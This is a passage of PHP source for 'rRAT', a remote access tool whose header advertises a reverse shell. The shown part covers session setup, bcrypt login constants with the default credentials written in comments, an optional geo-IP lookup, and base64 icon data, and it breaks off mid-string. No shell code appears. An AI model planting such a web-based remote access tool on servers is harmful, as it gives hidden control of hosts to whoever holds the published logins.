<?php
/************************************************************************************************************************
 * Name: rRAT - responsive RAT																							*
 * Version: 1.0																											*
 * Author: Bubbah Smith <smith.bubbah@gmail.com>																		*
 * Last Update: 2017-02-23																								*
 *																														*
 * rRAT is a PHP Remote Access Tool. It runs on *nix and Windows systems while the features on both systems might be	*
 * slightly different e.g. information on the RAM and the reverse shell are only available on *nix systems.				*
 * It comes with a fully responsive user interface utilizing bootstrap.													*
 *																														*
 * Included libraries: jQuery, Bootstrap																				*
 ************************************************************************************************************************/

session_name('rRAT');
session_start();
error_reporting(-1);

/*
 * Username and password as bcrypt hash. Should be changed by user!!!
 */
define('USER', '$2y$10$L74tJKykGPPsc0cqCTDjaOGrv3MvO7lJL7KWOu0QnxzJ5ojFmS0za');	// root
define('PASS', '$2y$10$SilhUoO2prlP.XUD83r2j.Vo/jwIh5BDxVfJHB60CZRXsi09Lh/e6');	// access

/*
 * If set to true WAN IP and informations on geo location and ISP gets retrieved from external source.
 * Additionally an extra menu entry gets activated, which opens the geo location in google maps.
 * Depending on the used api and the connection the login process can last very long.
 */
define('GEO', false);

/*
 * Stores external ip and info on geoloaction in the session to call these functions only once.
 */
if (isset($_SESSION) && $_SESSION['loggedin'] == 1 && GEO == true) 
{
	if (!isset($_SESSION['external_ip']) || $_SESSION['external_ip'] == null) 
	{
		$_SESSION['external_ip'] = Funcs::getExternalIp();
	}
	if (!isset($_SESSION['geo']) && isset($_SESSION['external_ip'])) 
	{
		$_SESSION['geo'] = Funcs::getLocation($_SESSION['external_ip']);
	} 
	elseif (!isset($_SESSION['geo']) && !isset($_SESSION['external_ip'])) 
	{
		$_SESSION['geo'] = Funcs::getLocation(Funcs::getExternalIp());
	}
}

/**
 * Class Icon
 * Holds all the icons as base64 strings.
 *
 * @function getIcon
 */
class Icon
{
	private static $icons = array(
		'favicon' => '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',
		'download' => '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',
		'edit' => 'iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAET0lEQVR42qWUb0xVZRzHf8/5d/8cLoLCIAS21KhlbTLnn7HZK9uMrbSx0Wq98IYTWpsTilgUZqIQvYBGNinfsDUMEkJERyyMLWKItKg7ZUwUhcsQQrjBPeeee85znvP03HvTSWBc6NnOq/Ocz+f7/M73HARrXDkul3gkOfmCblmJPT5fTvncnHe5fWgt8BOlpalZLS1lhqIcDpgmNQVheiQQOFDm8/X/b0FjU9PzmZmZvXOdna6JqirQdR0ChAAG0O5j/NbHfn/jmgWFhYUJ+QUFv1JK04lpwuzgIBo5doxqPl9Igkx2A3Fc+YVg8Pg1w6CrFtxq25pP0k6cCaBNYDIBxhjNj4/Rm6cqYGF0FPEcRyWeB4Hnv7uiae72QECLWtBX59y2Y7PW61fszrvycfCJO4ABw/dEltVTWQkLV69CSCCyKwjw4bszMxVRCb4qtm84tA8PGCp5UleBCrIE47aDoK4/hCTJRjkmYlDkqa2lU83NYOP52euGsfsLn+/2ioLDr0j8mULagVW8l8ERbxOpMwaDZQBM8/uRkn6SEsqHx00IoeMXL8L1pqYXSzyeK1G9g2CXowoZ2vsMznYLEBNPgGIKlAlC11+uLJhKrGQtcoX3E8uaO9fQ8GxNTc30igJvizM3SQ40hpITk6euDRQxAgUGDp0A2R2sORqdUzfCZHI1MqR0w+v17nstN7f7AeOxgp4vnc/tfkrr0xUqmzqHYhIQ5ShBLDUNJQfBDkQ0kO63aOh0ipEw0SeUHHwjr/inRznLCk4X2eMKstlLVchmnRVNjueRwLGWY4gIkATUTkBXCNIVNildUv/484k9L5WN/f5v1hKBO1vkzr6H2rFiZIeS2WNFkCTM5h6ZObUEABmBrmImANA1jtzTUnO2Hx1vWy7sEoHa6TjJY600NHfBLlKHHIZHkpscQjEi1TU9Amd7VEgp2ZI/+dnjRr1IMHbe+WqyHGhmD3KIE0BeZwI1/0nOToBkB2BDg2AEDiaXVJ+aN+3+r6I8FNSfeuHpA3sSr/EzrS6LIHCttxAr+IPGIORwUNPSEIPTUHoC8b982i7srW2bMaISdJ2vL9y+9ZlqMvQmjVt3BzhmYakjjRHtiPA6A9OwwDSdd5p/i9t1pG7yPqywHgr6LzWVZ6SlfBSc7QWszUIMvgyxdAgeaUx47qwx8wOTKVn7P7k7tBJ8kWDox9bTCbHyO7qiUENVwVjwoC3OzynIoXnjcB11jSdeNfXlXUVjP0QDXyQY6Wo95+TR67oaEVjmPEpytVCCDeC0G4j9i6ifbjyaUTBRGy18kWD48rcdNkT3ReAYRJGNnv2HJRsAnu8GTumtS8279/Zq4IsEnu/r+20W2WlhnQoCBUFk34FgUY4ntw083VHx9TdFZy9NmGsSuN3utJ2Z225tAr+QFCffwETvGR73/jx4c7SnuqFjcrXQJYJitoaHhzOUqYkPugcGV6zeatbfz5tWNy7sdLoAAAAASUVORK5CYII=',
		'delete' => 'iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAEZ0lEQVR42o2W209jVRTGv3N6BUrdXBQZKNVMhEmDUDMhAg8DIRkyiZcYgz6omcz44J9gNL74qn+JL+ItY4LxofqgZryMxBmNci0XgdLLoT2nPfftOrstLZYOc5LdNk3379v7W99aIKH2vBt/YjIQ7khFBwZYLr2t0FfzH6czq3iEx9tLbylajNaZvVIz/LVbt9hIfz/W1jfwxWefKrZhXChSh88ND7L48SHWHY4f7IaI1IDfZrHHe2HaZfgNjvS/h1heXlZss72It1f2+1MLo8+w4WwenIfhlo+wbpr40XKFiPTBWLzw+u232XA/wR0NrmUApgW/KWH7MIPP79xRHNNsEanDFyeeZUPFIuyiC5n8kOHC0DJC5CfTUaSP5p7n79y8CcNWBdy1THBasDwRGdtZBV99s0I3aYicwicnWIxzmLt5yLIsBHye6dxBsXSITzQTdIORwtIbb7HhPkb2VEU8AW56QhaCvgjSOQVfrqwojmXNewICnpxk8VAY+uYBZJefwiW6garlsGbouGvYiqiBPxROvbq0xGI9UXKn1BChJYc64LP82DrK4uvvvlc4OBafS7J4ZxesffK9pJ6Bl8o5rBsG7upWtQb1K/tDodQrL77Ehh+LwLJPqiKOAznYQXbRZsPFViZL31uId0XgKDqcg8MmOBdw7+Q/1+AiRc1F8wWDqZevL7JYdyfZpXheQJJDgA2xeFmjW9EHqo1JUW6GF8XJz8JP++CMSCCQemFujsUiHXBDMuD6qnCbfmpzQNdhbW4BBGvA8zW42dKg0nnZ9kRuzEyzp6jpXE4IRxYiEtlj7+/BzeeraanBN9rAzxVo7s6FZJKNDg7Srzoh2Q7cQh727m4DXqme/JeK2Xa0tBUQUZyaYvHuHvKa6kD+WxvkO682lGdNvlLAOln2a8V4dIH66W/MzhKcUWeG6PQWrK0tSJVyrVsl8U4FQkY/wRqJ3NMqF1tUh89T+49dihMoSL6bcI6OwHNZYYtfqnZsPUGcRPb0EtYqOlZVrX2R67ZcSyTY2FADzmnOOLs7Aq7oCgI+P/rC0VqCaNGLQ+PiwKrgT03DH6XS+eNaeD49w+LRnlO4F0WbrAFZ5MG9gnLakoh0YyAUEfDmZ8/Scb+s4sFJ8ey4lv2B1CLF0oP7eFAMOskmaygxrqaiYJxgQ6/gt7LubUQy0skSkSgGg50tAdlxTNynPX8pSnVUvH95qHB9dqYJboq8u+S5c5wRcC8p98rVItY4qYnuiBAZCoRbRLZdm26i4e98TpE+TF7hb85MU/G6RFo8OOgE9t4ucsTcMCotCamHYTwaFSIxf7BFZBUOvt1JQ3rv8qXCwtWrbIQGWJgiKds2rHQaOfVY2NIufnWRBGNCJE5zq/5sUrIeqCX8491A1MDnS10bH2cjNII78iqy2X1sCnj5oX/86yJXenqFyNMU4WY4mse1JPtSU4MD7Elqph3DxO8XwP8vMtrbx0YiEeyo6im8ZVyjzb8eFz0P2/sfPivaWw7hO/cAAAAASUVORK5CYII=',
		'copy' => 'iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAE60lEQVR42o1VW09cVRRee85czsyZu8gccKAgMuADoS9AoH0wVUlfTJsqD/WJxNjUNDFt9MEfYL01pjFqiEmrvBpifDCmKo2plbRPXBoemCAQkAEjl2FmmPtt+60NNKbQMDvZmXPZZ31rfetb3wgi0rE/xj6H7aTa1ib2Tezvjjso+ODw8PDVD69/JA3DJfafy/13T16r+1gsJt68eFHOzs6exf1vxwEsra+vt5akkPLooIcAbFarGL/zs0RiI7i/chzAP6nUbihXLNHCwl9UqVSoWq2SEIIsFos6pFk0yudzVC6Xqa3tBfJ6vXTv97s0NDR0G6/fPhZgN502y5WqnJ6eQlwLB5cIIhKJBDkcDoklrJpGJQDU1dXJhoYGMf7rLxIAf+L70SPiFrHvYa8pgHQmYwJLTk5OgidJTqdTlkolgeDgR8r0blp4PG7CM2psbJSFQkEsLizI8fHxIynNZrNibGwsE4/HzymATCYTsmhWun//D9IdOuEA1YfqSdd19V0FmZ9oaaVsPl+TxDRQuzAfpYGBgRkFgICm1WqT8/PzgvMol8qyqblJ8A14R3ZSVIVGTBmSkeiT0DSNNSGq1QrZbDZVMffPMNwyGAwIj+GkgN+/vV9B1nQ47PLBw4fCbrOhoXnp0HXBjU4mErK1tVXUhUyKzkVpa2tLMrJhGIqKYrFIgUBAAljJ0OVyyu6TJ4WOOD6f9zFASNcdNDExQVarlXK5HPn8frIgEmcdDoepMdxEKysrtLW5yRmTBU3nX+4Zq8tht1O+UKCWlhZyG4aiyev1xA96YIJvqGiaS2epSk6fm2q32yXkKjo6X6Tl5WVQlFZ0MKWlUlH4/QEksSM1zSpcLhdk3LbXcABDGHsVpNPpEL+cnpkhiRngKpgeXpAw+aD7SEcnxWKrtLOzo96ZpsmSfWqjq+iH2+3eqyC1u2uiLPno0SNVATJWWTAFzc3NcnFxERV00lpsjQFURTwc5UpZOHUn5FtUjeePXJB4e3tEMG1ut7FXQSKZNL0ej5yamlJp88eYAXWIwbiZvX19qCBG22gyqhV4pn6rVUmMh0qVQHgQTQxiCc1HBXsA2/EdM+D3sXntS82QaLTilFUD6xD9/f20urqqZIpmcjCVBOglHVnjkOpZMBiUz4XDooiGPwb4d2Mr9GxdkObm5liiikPOnj0nlUoRJpdOnT5NsdUYJZIJpTJWzcGywKs0q0apZJI6QaUfCsznC9xk1YP1v9fWG8INprIKqEYNF6pgGniaZTKVEn29vRSNRrkKicwE2wnAYSEeZS34TlXAlEYiEZFFEqBdVfDg+x9+7D87+Cqkph3ylhy4jkbnxKmBAdUDpojfsXxBj4AIiKeam8zWwubIEoe/kd/nUwBnoOWfXjt/3mm4jENyYwcdfOVleuP1C7DzBQXCNs5GyFOMSpUJ8jWvnp4ergjyzlAw4I8fZHwCe5D2/j6fXBe+Hhl56fKlS7S0tESbm5uqAgSVyFi5L1sLK4oPd3V1qefxRJLq657ZFnT8uvnFl19dvfLOZYIZqmCsMFYa2zYPXXd3t6KFwdj4+Hpja5sazVBNADeuf/Lpe+9fu4aPrTXZNa/FlVWKPN+yUQvAmfZIx91vbt0WTU1N/xfA0/63JSQqPr/xGY1+e2u0FgBeb2F/ALUEawHAYJZB1x1cv/sfkeSlRZbxeLwAAAAASUVORK5CYII=',
		'rename' => 'iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAB2klEQVR42q3WvUscQRjH8VmJwQRSSP6DKyJaBvEtBq8QJIWVjcaIoiAoIoJFDCRiJN3ZGbA5XyJaiIUQxcK3ICgJaCeKSSP2FlY5zSWn34eZM9667s6uDnzguJ17frvP7O6co/SoxgieI0/ljgvsoR/fVMjhoAxf0YUl/HPNkcA6JPEG62ED5AeTmAmYW4sxPDNXZR2QwlP8tpi/j6KAOSlz0gM4lIC/yA9xVnkBx5+gBe8RjxJgO3pQGxTQiA9K992xLCx1fmEUCb8AKf4JrfgR4gqlZgW+IOYXIAvaiW3LwjHUYAGneIGtbMBDZFw/SKNA3XwuvEYlFrFqgsrNSZ/5Bdgufqkp/Bnz2ESh0nfbH78W2QRI8RVMoNl89w5T9xFQatqyjJd4rPTDlX0j3CkgW7wDR7KY6MXstTmRA9zFpf9vXcUjB9gWjxRQYlrxE90m6LbikQJkr1hDHK/Q7lM8dECV0ptS0rSnL6B46IANpW/FaQzjWAWPqwCvV4IcPFf6CZeAQcyZ/tsOeS5OJODAXPb3awelJeMoDlHQPWTTaZOA1xhS+rW8q/SfgCl8tOiz13iEBiRQn91EmpTe4mRjeWDaklH/18Uxnx2Vu1aOx5y06Ya8NnYuAdVaoZ5IGHifAAAAAElFTkSuQmCC',
		'zip' => 'iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAEV0lEQVR42rVWS09rVRReu4VKS+mL8i6PBgYkBBICAybOyVW5VMWJAxJGJiY68G/oVBOiA+AKgzu6ufF1661SCWNGMiQQYksLhQK9YCln+6119u49mBideJJNd/ZZe33r+9bjoOh/fhT/aW9vjyeTyY/8fn/8wUslr0lrTbe3t1Sr1WQfCoX4juzte69to3FXLZdPv8KdCp+2pNPpz4eHhz/x+XzK+IadVnaDP+rq+pomJycpGo3q/Pa2iicSTRs4l70B1Pf39+rw8PDLo6OjT9kgNDo6ujmYSi34/P7X0bBfQ9HBvlqtCgCCoL29PYpFo16qrj0W+2g0GnR8fPzDwcHBkgCMjIxsDgwMLLS0tLhRSNikTHgagOry8pLGxsaop6dHb4MBM+Go2UaTGwsHhujFHgA/gsF7/L59cHDwSSqVeswSOY4jNP3Y8y2+wOfXkAhMaWhoSOdyOYU8iCPDWPZ810r6R6HwE0BcgL6+vg0ALHIEVhI4JiSd7Fnt1SuampqiQCBAfz5/Tm/G4wRa9HswSLvJpCst04CEfLdYLL4oFAouQHd390Z/f/8iHApNkz3luLpKRPW7O5qZmWF9dezZM/VxJKL9xaLKRiL0TTqtfczA2DtI8kmp9KJUKr3LAOHOzs41AGRYCvYHIJtfucB4nLiJiQnq6OjQB0+fqnQgoHWtporhMB0hLxyclYjt4TxbLpddgFgstgaJMuwciRa6xph8nEYsBhgfH6fe3l7KZrP0BqQymSU/ywJ7k2QpLDh/eXp6mhEAVMQ6S2T7wC0P9aAnGHB6eprC4bDO5/OKWeKMf4lMFVn2fH5ycvKzBegAwBoSvWiMmx0qe64qNy80NzcnUe7u7gpTr63JnfRJvV6ns7OzHJYLEIlEmIGUKVOELNq0p4TP/cGXEARBTr2/v69wJizFseNI3xgAYQwGLyuVSpPBBrRdYAApS/hmmnYM2P3s7Cy1tbXpnZ0d6S/lCcLKC1upurNKJQeJFvkQBCIbKNV3+AJTtJetSlbf5eVl7gO9uroqDBjYzh8Lxgx4FsH5L2DQBHjS1dX1tnFOtpocUxmmuwmOKZFIUCaTkXNrY+/xr2049MGvTQBI9C0A3uJatq1/32gIG6grNX6HRltZWZFG29raUtZGCsOMCilRbjRIBOcM8JgBomDAAI84mbZZLJhbSI402gdLSxTEDFpfXxeJbDOyLA0TkJ/3kAgVtH1+fv4aADl49PePh7f0+Jc/OPyEMH945pCZuRwUM5HgTFkj+rwXYAtftHl3Vvk4LKHprSIGE8lQJSahzRHtORN7PofzPEAW2EkM82UTyZv3m1IDijhlh6x5a2ur8iRcm0CaXzHe20qzkl5cXPyGJQCRYDD4NQbe+7YaLHVvBVnpPEwefLtNP4hE/FUDg++urq4+ZACeD/MA+Yw/+t4x0RwXHuf/9HhzB/Dqzc3NFzj73t4IYPVitf23f0b+9bnFKmLV/wLGOPUzD+MSCQAAAABJRU5ErkJggg==',
		'loading' => '',
		'paste' => 'iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkY3RUJEMUI3RjJCNDExRTZBNDgxRjlFNTU1QTI2ODNBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkY3RUJEMUI4RjJCNDExRTZBNDgxRjlFNTU1QTI2ODNBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RjdFQkQxQjVGMkI0MTFFNkE0ODFGOUU1NTVBMjY4M0EiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RjdFQkQxQjZGMkI0MTFFNkE0ODFGOUU1NTVBMjY4M0EiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz59Scb9AAADN0lEQVR42rRWy29MURz+zrl3pnemUzWlrQglJMpGohILIV6JSG1YiJVYCJFgQ1TKxoaFjY3aiEf8AcKqG1ELYUEiIkGjXhH0RTs1nd7XOT+/c+e2Hp2ZTtr4TX53cu895/ed7/vO44qrRxbDRKgFamuAPesTsKSEkBYSdhLJlLhozUMnTeCRN0abFSn4vo8Mt33zTaH7RYB5KQEiQqmQf96IyRTmSkg54ca3X3Tn3gvy5J3HtN5Jqytaq+i9KZewMGPY+AfBSQj4StzmES3VfrA1X1DndRheHs6hW7vqlVa0hkhkkrY46of0vMzApwPYEhtyBYy9/qp2ty7SBwo+MOgBq5uDnfdOqJueJw8NjVlCCmznthgew/VnH9S+VFIs4+4jnM/LASznPMyyn3VD4N1AgLalBB0WBaQQG8fz4hOx9mkrjDoZ/fsGxbr+nOxbkOE2xJJJeVyN9nc1IQBYukABpp7NFHexNPuUJtQwnMcPn77X/C+KWpPG6MAgFPcTsWNG+9wEFxgGhkYiuyA8tDduau96mN0BP/8dWcdGoyMNAMnYW/AzfB8H7vfaYCmi4lpprGw7iHR9M4O4EYDLBWsZZEuSYDxQgYeW+enVo1subDv3JN1Ty21WNQBtC5mBZgTBP9ORWRl2yCSLzvkTP1G3sAX7T91CFbGi53P+QbL/5aUFdc6ZOruGmSYiBiCUngpmSkr5ey4aGcuFJc3sI7iW05ELIEY83ZEPdORB2TDvtNZQRmOWTKuwAoDEkoyNtY0pONCnF6cRNDnihpGoaEBJAComgxA7bMDKhetqtNZL3N3ZACM4T+VjGkLbVIGCeUUsS1RYoCKAqRKyifUpG5OKG3tjD0pzMJLrmIXpRTMsW9O+4P4lI8UeUEWJqmFQdqvQDCtEeQ8MA8WFxWwBKntAU1mNRKUZRLOojAeTRvNqNuv9vzCYkgizBpjZ5GgQNEuJqvFAz41BcUcsvRdRnHMDiI9iUXolE2YtkTlPbE+J0BKkEpaezoTvpcVfFzWpaM+XUlZdPJZW2CEf8CFEnrfia/x8KD4Wip8ySGB05Ad9+dibqMs22747TlWOPKuU6uX8/EuAAQBcEPzfrYaplQAAAABJRU5ErkJggg==',
		'folder' => 'iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAACRElEQVRYw+2XPWgUQRTH/zM7xybBED+4kwQhiF6KWKUUqwS0EStBC7UQbOxFECxFCBZ2ioKxsIsggihiEbAQKwsRDH5APJCLOfNx7u7d3u7MvGdxOfOhSfbkGC3yYGEX3sz77fv4MwNs27JdP+Vn9z3tdyyuWP1RfnZyXMJ0b7aAIXh6bs+VsfP36p0AUK2XDw8On5HVd5c5A/GAle958eodsfvaH33KUxcxMHa7vQx8mhj+6Hu6mGWRlT1f08Kxo0F1IV2/WZcvoRtBvpiv3hKw/ZvtEzfspAKAs0f8HY1gqVjN9UMIsTUB8z6VvJr2vdya4JYYpZkEoyOELq6tr/BvRmT2KwAo9CReaV5i6MJzKGH/up3iuI4fL++jWz0EkbflCmIRCQCYeXzi0uxs5Ubv3iHILBnYwLQxONj7Gb6oZfKvxfaueDE+PDg64n1hsp0ZqzZ+IKiZm2qXH/QS9YFZdGawOSsoYA1HqrKUBkzuhY8ZsIRQvn7zPWQWIAu3DwFGcyQAqOjJIf0v5L+ykJxTAEyaMpQn3EYXgDEcqub4cFvd25lpAVJNgWoqEiwIntMmFEDcoHAZgEPL2Om4AojqJvoFQMxuARiYm4+bJbDEARPDdRc+mlpsl